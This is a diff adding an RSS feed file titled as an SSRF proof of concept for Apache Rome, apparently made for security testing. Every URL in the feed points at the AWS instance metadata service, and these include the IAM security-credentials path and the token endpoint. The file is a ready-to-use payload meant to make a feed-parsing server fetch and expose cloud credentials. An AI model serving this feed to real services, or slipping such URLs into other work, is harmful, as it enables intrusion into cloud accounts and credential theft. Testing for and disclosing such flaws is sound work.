@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>POC SSRF Enclosure Test</title>
+    <link>http://srv1.bhacky.com:9999/poc_enclosure.xml</link>
+    <description>RSS feed with enclosure pointing to AWS IMDS to test Apache Rome secondary fetch behavior</description>
+    <atom:link href="http://169.254.169.254/latest/meta-data/" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>Test Item 1 — Enclosure IMDS</title>
+      <link>http://169.254.169.254/latest/meta-data/iam/security-credentials/</link>
+      <description>Item with enclosure pointing to IMDS</description>
+      <pubDate>Wed, 29 May 2026 18:00:00 GMT</pubDate>
+      <guid>imds-poc-1</guid>
+      <enclosure url="http://169.254.169.254/latest/meta-data/iam/security-credentials/" length="0" type="application/json"/>
+      <media:content url="http://169.254.169.254/latest/meta-data/" type="text/plain"/>
+      <media:thumbnail url="http://169.254.169.254/latest/api/token"/>
+    </item>
+  </channel>
+</rss>
